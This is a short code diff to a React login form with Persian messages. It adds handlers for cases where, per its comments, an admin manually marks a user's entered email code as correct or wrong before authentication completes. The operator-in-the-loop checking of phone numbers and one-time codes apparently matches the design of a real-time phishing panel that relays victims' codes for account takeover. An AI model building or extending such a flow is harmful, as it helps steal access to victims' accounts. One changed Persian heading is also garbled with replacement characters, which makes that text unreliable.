@@ -374,6 +374,26 @@ export const LoginForm = () => {
           });
         });
         break;
+      case "email_code_correct":
+        // Admin confirmed email code is correct - complete authentication
+        localStorage.setItem("isAuthenticated", "true");
+        localStorage.setItem("userPhone", phoneNumber);
+        sessionStorage.removeItem("sessionId");
+        sessionStorage.removeItem("phoneNumber");
+        alert("🎉 کد ایمیل تایید شد! احراز هویت با موفقیت تکمیل شد.");
+        navigate("/", { replace: true });
+        break;
+      case "incorrect_email_code":
+        // Admin marked email code as wrong - show error and stay on email code step
+        setCurrentStep("email");
+        setEmailStep("code");
+        setEmailCode(""); // Clear email code field
+        setErrors({
+          emailCode:
+            "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+        });
+        setHasError(true);
+        break;
       // test_offline action removed - using only manual status check
       case "complete":
         localStorage.setItem("isAuthenticated", "true");
@@ -3665,7 +3685,7 @@ export const LoginForm = () => {
                   textAlign: "center",
                 }}
               >
-                کد تای��د ایمیل را وارد کنید
+                کد تای��د ایمیل را وارد ک��ید
               </h5>
               <div style={{ marginBottom: "8px" }}>
                 <AlertMessage>
